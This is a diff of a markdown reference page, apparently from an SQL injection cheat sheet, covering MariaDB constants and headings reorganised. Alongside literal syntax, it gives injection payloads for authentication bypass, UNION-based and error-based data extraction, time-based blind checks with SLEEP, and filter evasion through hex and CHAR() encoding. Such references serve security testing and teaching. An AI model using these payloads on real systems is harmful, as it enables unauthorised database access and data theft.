@@ -7,11 +7,9 @@ tags: ["constants", "literals", "reference"]
 lastUpdated: 2025-12-18
 ---
 
-## Constants
-
 MariaDB supports various types of constants (literals) that can be valuable in SQL injection attacks. Understanding these constants helps in crafting more effective payloads and bypassing certain filters.
 
-### Numeric Constants
+## Numeric Constants
 
 MariaDB supports several formats for numeric literals:
 
@@ -25,7 +23,7 @@ MariaDB supports several formats for numeric literals:
 | Binary              | `0b1111`        | Same as 15             |
 | Boolean             | `true`, `false` | Same as 1 and 0        |
 
-### String Constants
+## String Constants
 
 String literals can be represented in several ways:
 
@@ -37,7 +35,7 @@ String literals can be represented in several ways:
 | CHAR()        | `CHAR(97,100,109,105,110)` | Builds 'admin' from ASCII codes             |
 | Binary String | `_binary'text'`            | Binary string                               |
 
-#### Building Strings with CHAR()
+### Building Strings with CHAR()
 
 The CHAR() function converts integers to characters, useful for bypassing quote filters:
 
@@ -49,7 +47,7 @@ SELECT CHAR(97, 100, 109, 105, 110) -- Returns: admin
 SELECT CONCAT(CHAR(116), CHAR(101), CHAR(115), CHAR(116)) -- Returns: test
 ```
 
-### Temporal Constants
+## Temporal Constants
 
 Date and time constants:
 
@@ -60,7 +58,7 @@ Date and time constants:
 | Datetime  | `'2025-12-18 15:30:45'`           | YYYY-MM-DD HH:MM:SS format |
 | Timestamp | `TIMESTAMP '2025-12-18 15:30:45'` | ANSI SQL timestamp         |
 
-### Special Constants
+## Special Constants
 
 MariaDB has several special values:
 
@@ -74,7 +72,7 @@ MariaDB has several special values:
 | `CURRENT_DATE`      | Current date                                                             |
 | `CURRENT_TIME`      | Current time                                                             |
 
-#### COALESCE Function
+### COALESCE Function
 
 The COALESCE function returns the first non-NULL value in a list:
 
@@ -86,7 +84,7 @@ SELECT COALESCE(NULL, 'default_value') -- Returns: default_value
 SELECT COALESCE(NULL, NULL, @@version) -- Returns: version string
 ```
 
-### System Constants
+## System Constants
 
 Some important MariaDB system constants:
 
@@ -101,7 +99,7 @@ Some important MariaDB system constants:
 | `@@port`      | MariaDB port        | `3306`                     |
 | `@@log_error` | Error log path      | `/var/log/mysql/error.log` |
 
-### Boolean Expressions
+## Boolean Expressions
 
 Boolean expressions evaluate to 1 or 0:
 
@@ -114,9 +112,9 @@ Boolean expressions evaluate to 1 or 0:
 | `true AND true`    | 1 (true)  |
 | `true AND false`   | 0 (false) |
 
-### Using Constants in SQL Injection
+## Using Constants in SQL Injection
 
-#### String Constants in Bypasses
+### String Constants in Bypasses
 
 ```sql
 -- Standard string
@@ -129,7 +127,7 @@ Boolean expressions evaluate to 1 or 0:
 ' OR 0x61='a' -- (a='a')
 ```
 
-#### Numeric Constants in Bypasses
+### Numeric Constants in Bypasses
 
 ```sql
 -- Boolean as number
@@ -142,9 +140,9 @@ Boolean expressions evaluate to 1 or 0:
 ' OR 4-3 -- (evaluates to 1)
 ```
 
-#### Practical Applications
+### Practical Applications
 
-##### Using Boolean Constants
+#### Using Boolean Constants
 
 ```sql
 -- Simple authentication bypass
@@ -153,7 +151,7 @@ Boolean expressions evaluate to 1 or 0:
 ' OR 1=1 -- -
 ```
 
-##### Using String Constants
+#### Using String Constants
 
 ```sql
 -- Hex-encoded bypass
@@ -167,7 +165,7 @@ SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 0x696E6A6563746564
 -- 0x696E6A6563746564 = 'injected'
 ```
 
-##### Using System Constants
+#### Using System Constants
 
 ```sql
 -- Information gathering
@@ -177,7 +175,7 @@ SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 0x696E6A6563746564
 ' UNION SELECT CONCAT(@@datadir,'/mysql/user.MYD') -- -
 ```
 
-### Error-Based Injection with Constants
+## Error-Based Injection with Constants
 
 ```sql
 -- UPDATEXML error-based extraction
@@ -190,7 +188,7 @@ SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 0x696E6A6563746564
 ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
 ```
 
-### Constants in Time-Based Attacks
+## Constants in Time-Based Attacks
 
 ```sql
 -- Sleep only if condition is true
@@ -200,7 +198,7 @@ SELECT id, username FROM users WHERE id = 999 UNION SELECT 1, 0x696E6A6563746564
 ' AND IF(SUBSTR(@@version,1,1)=0x31,SLEEP(5),0) -- - (checking for '1')
 ```
 
-### Case Sensitivity
+## Case Sensitivity
 
 Boolean and NULL constants are case-insensitive, useful for bypassing case-sensitive filters:
 
@@ -216,7 +214,7 @@ SELECT NULL, Null, null   -- All return NULL
 ' OR true -- -
 ```
 
-### Limitations and Considerations
+## Limitations and Considerations
 
 1. Hex string literals are MySQL/MariaDB-specific and may not work in other databases
 2. Some constants like `true`/`false` are case-insensitive (can be used for filter bypass)
